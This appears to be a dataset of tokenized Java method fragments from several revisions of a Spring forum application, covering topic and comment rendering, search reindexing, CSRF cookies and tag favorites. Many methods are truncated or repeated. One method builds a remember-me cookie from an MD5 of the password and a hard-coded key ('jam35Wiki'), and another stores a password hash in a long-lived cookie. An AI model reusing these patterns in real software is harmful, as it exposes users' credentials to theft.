public boolean preHandle ( HttpServletRequest request , HttpServletResponse response , Object handler ) throws Exception { if ( handler instanceof ResourceHttpRequestHandler | | handler instanceof DefaultServletHttpRequestHandler ) { return true ; } String name ; if ( handler instanceof HandlerMethod ) { name = ( ( HandlerMethod ) handler ) . getBeanType ( ) . getSimpleName ( ) ; } else { name = handler . getClass ( ) . getSimpleName ( ) ; } CommonsLogStopWatch watch = new CommonsLogStopWatch ( name ) ; watch . setTimeThreshold ( TIME_THRESHOLD ) ; request . setAttribute ( ATTRIBUTE , watch ) ; return true ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure , user , null ) ; TopicMenu topicMenu = getMessageMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws IOException , SolrServerException , MessageNotFoundException { Topic msg = topicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentDao.getCommentList(msg, true); 
public void handleMessage ( UpdateMonth msgUpdate ) throws MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > topicIds = topicDao . getMessageForMonth ( year , month ) ; for ( int topicId : topicIds ) { reindexMessage ( topicId , true ) ; } solrServer . commit ( ) ; long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUndeletable ( message ) ; ModelAndView mv = new ModelAndView ( " undelete " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareTopic ( message , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ) ; return mv ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; ModelAndView mv = new ModelAndView ( " uncommit " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareTopic ( message , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ) ; return mv ; } 
public PreparedTopic prepareTopic ( Topic message , boolean secure , User user ) { return prepareMessage ( message , messageDao . getTags ( message ) , false , null , secure , user , null ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > tags , boolean minimizeCut , PreparedPoll poll , boolean secure , MessageText text ) { return prepareMessage ( message , tags , minimizeCut , poll , secure , null , text ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > tags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user , MessageText text ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure , user , textMap . get ( message . getId ( ) ) ) ; TopicMenu topicMenu = getMessageMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
private Map < Integer , MessageText > loadTexts ( List < Topic > messages ) { return msgbaseDao . getMessageText ( Lists . newArrayList ( 
public Integer apply ( Topic comment ) { return comment . getId ( ) ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure , textMap . get ( message . getId ( ) ) ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public static void initCookie ( Properties cookies , HttpServletResponse response ) { if ( cookies . get ( CSRF_COOKIE ) = = null ) { SecureRandom random = new SecureRandom ( ) ; 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = LoginController.ACEGI_COOKIE_NAME; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = Base64.encodeBase64String(tokenValue.getBytes()); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); acegi.setHttpOnly(true); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
private void createCookies ( HttpServletResponse response , HttpSession session , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( configuration . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; cookie . setHttpOnly ( true ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , user . getNick ( ) ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , session ) ; CSRFProtectionService . generateCSRFCookie ( response ) ; } 
public static void initCookie ( Properties cookies , HttpServletResponse response ) { if ( cookies . get ( CSRF_COOKIE ) = = null ) { generateCSRFCookie ( response ) ; 
public static void generateCSRFCookie ( HttpServletResponse response ) { SecureRandom random = new SecureRandom ( ) ; byte [ ] value = new byte [ 16 ] ; random . nextBytes ( value ) ; Cookie cookie = new Cookie ( CSRF_COOKIE , new String ( Base64 . encodeBase64 ( value ) ) ) ; cookie . setMaxAge ( TWO_YEARS ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; } 
public String formatUrlBody ( int maxLength ) throws URIException { String all = getURIReference ( ) ; String scheme = getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; if ( _true_lor_url ) { if ( uriWithoutScheme . length ( ) < maxLength + 1 ) { 
public String formatUrlBody ( int maxLength ) throws URIException { String all = getURIReference ( ) ; String scheme = getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; int trueMaxLength = maxLength - 3 ; '...' if(_true_lor_url) { if(uriWithoutScheme.length() < trueMaxLength + 1) { 
private void createCookies ( HttpServletResponse response , HttpServletRequest request , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( configuration . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; cookie . setHttpOnly ( true ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , user . getNick ( ) ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , request . getSession ( ) ) ; CSRFProtectionService . generateCSRFCookie ( request , response ) ; } 
private static String makeLogString ( String message , String remoteAddress , String xForwardedFor ) { StringBuilder logMessage = new StringBuilder ( ) ; logMessage . append ( message ) . append ( " ; ip: " ) . append ( remoteAddress ) ; if ( xForwardedFor ! = null ) { logMessage . append ( " XFF: " ) . append ( xForwardedFor ) ; } return logMessage . toString ( ) ; } 
public static void generateCSRFCookie ( HttpServletRequest request , HttpServletResponse response ) { SecureRandom random = new SecureRandom ( ) ; byte [ ] value = new byte [ 16 ] ; random . nextBytes ( value ) ; String token = new String ( Base64 . encodeBase64 ( value ) ) ; Cookie cookie = new Cookie ( CSRF_COOKIE , token ) ; cookie . setMaxAge ( TWO_YEARS ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; request . setAttribute ( CSRF_COOKIE , token ) ; } 
public String formatUrlBody ( int maxLength ) throws URIException { String all = getURIReference ( ) ; String scheme = getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; int trueMaxLength = maxLength - 3 ; '...' if(_true_lor_url) { if(uriWithoutScheme.length() < maxLength + 1) { 
public static boolean checkCSRF ( HttpServletRequest request ) { String cookieValue = ( String ) request . getAttribute ( CSRF_ATTRIBUTE ) ; if ( Strings . isNullOrEmpty ( cookieValue ) ) { logger . info ( " Missing CSRF cookie " ) ; return false ; } String inputValue = request . getParameter ( CSRF_INPUT_NAME ) ; if ( Strings . isNullOrEmpty ( inputValue ) ) { logger . info ( " Missing CSRF input " ) ; return false ; } boolean r = inputValue . equals ( cookieValue ) ; if ( ! r ) { logger . info ( String . format ( " Flood protection (CSRF cookie differs: cookie=%s param=%s) ip=%s " , cookieValue , inputValue , request . getRemoteAddr ( ) ) ) ; } return r ; } 
public String processAction ( HttpServletRequest request , String action ) { return action ; } 
public String processFormFieldValue ( HttpServletRequest request , String name , String value , String type ) { return value ; } 
public String processUrl ( HttpServletRequest request , String url ) { return url ; } 
public static void generateCSRFCookie ( HttpServletRequest request , HttpServletResponse response ) { SecureRandom random = new SecureRandom ( ) ; byte [ ] value = new byte [ 16 ] ; random . nextBytes ( value ) ; String token = new String ( Base64 . encodeBase64 ( value ) ) ; Cookie cookie = new Cookie ( CSRF_COOKIE , token ) ; cookie . setMaxAge ( TWO_YEARS ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; request . setAttribute ( CSRF_ATTRIBUTE , token ) ; } 
public static Set < Integer > makeHideSet ( UserDao userDao , CommentList comments , int filterChain , Set < Integer > ignoreList ) throws SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return null ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public boolean isHaveAnswers ( ) { return ! childs . isEmpty ( ) ; } 
public void updateLatestEditorInfo ( User editor , Comment original , Comment comment ) { List < EditHistoryDto > editHistoryDtoList = editHistoryService . getEditInfo ( original . getId ( ) , EditHistoryObjectTypeEnum . COMMENT ) ; commentDao . updateLatestEditorInfo ( original . getId ( ) , 
public void updateLastModifiedToCurrentTime ( int topicId ) { jdbcTemplate . update ( updateLastmodToCurrentTime , 
public String format ( String text , boolean secure ) { String escapedText = StringUtil . escapeHtml ( text ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String token = st . nextToken ( ) ; String formattedToken = formatURL ( token , secure ) ; sb . append ( formattedToken ) ; } return sb . toString ( ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
public ModelAndView register ( @ModelAttribute ( " form " ) RegisterRequest form , HttpServletResponse response ) throws Exception { response . setHeader ( " Cache-Control " , " no-store, no-cache, must-revalidate " ) ; return new ModelAndView ( " register " ) ; } 
public static boolean checkCSRF ( HttpServletRequest request ) { String cookieValue = ( String ) request . getAttribute ( CSRF_ATTRIBUTE ) ; if ( Strings . isNullOrEmpty ( cookieValue ) ) { logger . info ( " Missing CSRF cookie " ) ; return false ; } String inputValue = request . getParameter ( CSRF_INPUT_NAME ) ; if ( Strings . isNullOrEmpty ( inputValue ) ) { logger . info ( " Missing CSRF input " ) ; return false ; } boolean r = inputValue . equals ( cookieValue ) ; if ( ! r ) { logger . info ( String . format ( " Flood protection (CSRF cookie differs: cookie=%s param=%s) ip=%s url=%s " , cookieValue , inputValue , request . getRemoteAddr ( ) , request . getRequestURI ( ) ) ) ; } return r ; } 
public static boolean checkCSRF ( HttpServletRequest request ) { String cookieValue = ( String ) request . getAttribute ( CSRF_ATTRIBUTE ) ; if ( Strings . isNullOrEmpty ( cookieValue ) ) { logger . info ( " Missing CSRF cookie " ) ; return false ; } String inputValue = request . getParameter ( CSRF_INPUT_NAME ) ; if ( Strings . isNullOrEmpty ( inputValue ) ) { logger . info ( " Missing CSRF input " ) ; return false ; } boolean r = inputValue . trim ( ) . equals ( cookieValue . trim ( ) ) ; if ( ! r ) { logger . info ( String . format ( " Flood protection (CSRF cookie differs: cookie=%s param=%s) ip=%s url=%s " , cookieValue , inputValue , request . getRemoteAddr ( ) , request . getRequestURI ( ) ) ) ; } return r ; } 
public ModelAndView tagFeed ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response , @PathVariable String tag ) throws Exception { topicListForm . setTag ( tag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; boolean rss = topicListForm . getOutput ( ) ! = null & & " rss " . equals ( topicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " counter " , tagService . getCounter ( tag ) ) ; modelAndView . addObject ( " url " , tagListUrl ( tag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " favsCount " , userTagService . countFavs ( tagService . getTagId ( tag ) ) ) ; modelAndView . setViewName ( " tag-topics " ) ; return modelAndView ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; List < String > r = userTagService . addMultiplyTags ( user , tagName , true ) ; if ( ! r . isEmpty ( ) ) { ModelAndView modelAndView = showList ( request , tagName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , Object > favoriteTagAddJSON ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; try { int id = userTagService . favoriteAdd ( user , tagName ) ; 
Map < String , Object > favoriteTagDelJSON ( ServletRequest request , @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; int tagId = userTagService . favoriteDel ( user , tagName ) ; return ImmutableMap . < String , Object > of ( " count " , userTagService . countFavs ( tagId ) ) ; } 
public int countFavs ( int tagId ) { return jdbcTemplate . queryForInt ( " SELECT count(*) FROM user_tags WHERE tag_id=:tagId AND is_favorite " , 
public int favoriteAdd ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagId ( tagName ) ; userTagDao . addTag ( user . getId ( ) , tagId , true ) ; return tagId ; } 
public int favoriteDel ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagId ( tagName ) ; userTagDao . deleteTag ( user . getId ( ) , tagId , true ) ; return tagId ; } 
public int countFavs ( int id ) { return userTagDao . countFavs ( id ) ; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { ModelAndView mav = new ModelAndView ( ) ; mav . setViewName ( " boxlets/gallery " ) ; List < GalleryItem > list = imageDao . getGalleryItems ( COUNT_ITEMS ) ; mav . addObject ( " items " , list ) ; return mav ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " original " ) ) ; item . setIcon ( rs . getString ( " icon " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; item . setHtmlPath ( htmlPath ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public Image imageForTopic ( Topic topic ) { return jdbcTemplate . queryForObject ( " SELECT id, topic, original, icon FROM images WHERE topic=? " , 
public Image mapRow ( ResultSet rs , int i ) throws SQLException { return new Image ( rs . getInt ( " id " ) , 
public void saveImage ( int topicId , String original , String icon ) { jdbcTemplate . update ( " INSERT INTO images (topic, original, icon) VALUES (?,?,?) " , topicId , original , icon ) ; } 
public PreparedTopic prepareTopic ( Topic message , boolean secure , User user ) { return prepareMessage ( message , messageDao . getTags ( message ) , false , null , secure , user , null , null ) ; } 
public PreparedTopic prepareTopicPreview ( Topic message , List < String > tags , Poll newPoll , boolean secure , String text , Image image ) { return prepareMessage ( message , 
private PreparedTopic prepareMessage ( Topic message , List < String > tags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user , MessageText text , Image image ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
private PreparedImage prepareImage ( Image image , boolean secure ) { String mediumName = image . getMedium ( ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; if ( ! new File ( htmlPath , mediumName ) . exists ( ) ) { mediumName = image . getIcon ( ) ; } try { ImageInfo mediumImageInfo = new ImageInfo ( htmlPath + mediumName ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getMessageMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure , null , textMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) throws ServletException , IOException { if ( filterConfig = = null ) { return ; } HttpServletRequest hsr = ( HttpServletRequest ) servletRequest ; String path = hsr . getServletPath ( ) ; if ( ! path . endsWith ( " .css " ) & & ! path . endsWith ( " .png " ) & & ! path . endsWith ( " .jpg " ) ) { try { Template tmpl = new Template ( ( HttpServletRequest ) servletRequest , ( HttpServletResponse ) servletResponse , userDao , configuration ) ; servletRequest . setAttribute ( " template " , tmpl ) ; } catch ( Exception ex ) { logger . fatal ( " Can't build Template " , ex ) ; return ; } } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
public Image imageForTopic ( @Nonnull Topic topic ) { return jdbcTemplate . queryForObject ( " SELECT id, topic, original, icon FROM images WHERE topic=? " , 
private PreparedTopic prepareMessage ( Topic message , List < String > tags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user , MessageText text , @Nullable Image image ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
private PreparedImage prepareImage ( @Nonnull Image image , boolean secure ) { Preconditions . checkNotNull ( image ) ; String mediumName = image . getMedium ( ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; if ( ! new File ( htmlPath , mediumName ) . exists ( ) ) { mediumName = image . getIcon ( ) ; } try { ImageInfo mediumImageInfo = new ImageInfo ( htmlPath + mediumName ) ; 
private PreparedComment prepareComment ( Comment comment , CommentList comments , boolean secure , boolean rss , Template tmpl , Topic topic ) throws UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; return prepareComment ( messageText , comment , comments , secure , rss , tmpl , topic ) ; } 
private boolean isEditableNow ( boolean moderatorMode , boolean moderatorAllowEditComments , boolean commentEditingAllowedIfAnswersExists , int commentScoreValueForEditing , int userScore , boolean authored , boolean haveAnswers , int commentExpireMinutesForEdit , long commentTimestamp ) { Boolean editable = moderatorMode & & moderatorAllowEditComments ; long nowTimestamp = new java . util . Date ( ) . getTime ( ) ; if ( ! editable & & authored ) { boolean isbyMinutesEnable ; if ( commentExpireMinutesForEdit ! = 0 ) { long deltaTimestamp = commentExpireMinutesForEdit * 60 * 1000 ; isbyMinutesEnable = commentTimestamp + deltaTimestamp > nowTimestamp ; } else { isbyMinutesEnable = true ; } boolean isbyAnswersEnable = true ; if ( ! commentEditingAllowedIfAnswersExists & & haveAnswers ) { isbyAnswersEnable = false ; } boolean isByScoreEnable = true ; if ( commentScoreValueForEditing > userScore ) { isByScoreEnable = false ; } editable = isbyMinutesEnable & isbyAnswersEnable & isByScoreEnable ; } return editable ; } 
private boolean isDeletableNow ( boolean moderatorMode , boolean expired , boolean authored , boolean haveAnswers , long commentTimestamp ) { long nowTimestamp = new java . util . Date ( ) . getTime ( ) ; return moderatorMode | | ( ! expired & & 
public PreparedComment prepareCommentForReplayto ( Comment comment , boolean secure ) throws UserNotFoundException { return prepareComment ( comment , null , secure , false , null , null ) ; } 
public PreparedComment prepareCommentForEdit ( Comment comment , String message , boolean secure ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , secure ) ; return new PreparedComment ( comment , 
public List < PreparedComment > prepareCommentListRSS ( CommentList comments , List < Comment > list , boolean secure ) throws UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareComment ( comment , comments , secure , true , null , null ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list , boolean secure , Template tmpl , Topic topic ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . newArrayList ( Iterables . transform ( list , new Function < Comment , Integer > ( ) { @Override public Integer apply ( Comment comment ) { return comment . getId ( ) ; } } ) ) ) ; List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText text = texts . get ( comment . getId ( ) ) ; commentsPrepared . add ( prepareComment ( text , comment , comments , secure , false , tmpl , topic ) ) ; } return commentsPrepared ; } 
public boolean isShowLastMod ( ) { return showLastMod ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) throws Exception { Topic topic = messageDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( topic . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! topic . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( topic . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . toString ( ) ) ) ; } 
public boolean isCommentEditableNow ( boolean moderatorMode , boolean moderatorAllowEditComments , boolean commentEditingAllowedIfAnswersExists , int commentScoreValueForEditing , int userScore , boolean authored , boolean haveAnswers , int commentExpireMinutesForEdit , long commentTimestamp ) { Boolean editable = moderatorMode & & moderatorAllowEditComments ; long nowTimestamp = new java . util . Date ( ) . getTime ( ) ; if ( ! editable & & authored ) { boolean isbyMinutesEnable ; if ( commentExpireMinutesForEdit ! = 0 ) { long deltaTimestamp = commentExpireMinutesForEdit * 60 * 1000 ; isbyMinutesEnable = commentTimestamp + deltaTimestamp > nowTimestamp ; } else { isbyMinutesEnable = true ; } boolean isbyAnswersEnable = true ; if ( ! commentEditingAllowedIfAnswersExists & & haveAnswers ) { isbyAnswersEnable = false ; } boolean isByScoreEnable = true ; if ( commentScoreValueForEditing > userScore ) { isByScoreEnable = false ; } editable = isbyMinutesEnable & isbyAnswersEnable & isByScoreEnable ; } return editable ; } 
public boolean isCommentDeletableNow ( boolean moderatorMode , boolean expired , boolean authored , boolean haveAnswers , long commentTimestamp ) { long nowTimestamp = new java . util . Date ( ) . getTime ( ) ; return moderatorMode | | ( ! expired & & 
public boolean isCommentEditableNow ( boolean moderatorMode , boolean moderatorAllowEditComments , boolean commentEditingAllowedIfAnswersExists , int commentScoreValueForEditing , int userScore , boolean authored , boolean haveAnswers , int commentExpireMinutesForEdit , long commentTimestamp ) { Boolean editable = moderatorMode & & moderatorAllowEditComments ; long nowTimestamp = System . currentTimeMillis ( ) ; if ( ! editable & & authored ) { boolean isbyMinutesEnable ; if ( commentExpireMinutesForEdit ! = 0 ) { long deltaTimestamp = commentExpireMinutesForEdit * 60 * 1000 ; isbyMinutesEnable = commentTimestamp + deltaTimestamp > nowTimestamp ; } else { isbyMinutesEnable = true ; } boolean isbyAnswersEnable = true ; if ( ! commentEditingAllowedIfAnswersExists & & haveAnswers ) { isbyAnswersEnable = false ; } boolean isByScoreEnable = true ; if ( commentScoreValueForEditing > userScore ) { isByScoreEnable = false ; } editable = isbyMinutesEnable & isbyAnswersEnable & isByScoreEnable ; } return editable ; } 
public boolean isCommentDeletableNow ( boolean moderatorMode , boolean expired , boolean authored , boolean haveAnswers , long commentTimestamp ) { long nowTimestamp = System . currentTimeMillis ( ) ; return moderatorMode | | ( ! expired & & 
private static boolean isDeletableByUser ( Topic topic , User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . HOUR_OF_DAY , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( topic . getPostdate ( ) . compareTo ( hourDeltaTime ) > = 0 & & topic . getUid ( ) = = user . getId ( ) ) ; } 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) { Section section = sectionService . getSection ( sectionid ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " section " , params ) ; } 
public ModelAndView forum ( ) { return handleRequestInternal ( Section . SECTION_FORUM ) ; } 
public Boolean isModeratorAllowedToEditComments ( ) { String property = properties . getProperty ( " comment.isModeratorAllowedToEdit " ) ; if ( property = = null ) { return false ; } return Boolean . valueOf ( property ) ; } 
public Boolean isCommentEditingAllowedIfAnswersExists ( ) { String property = properties . getProperty ( " comment.isEditingAllowedIfAnswersExists " ) ; if ( property = = null ) { return false ; } return Boolean . valueOf ( property ) ; } 
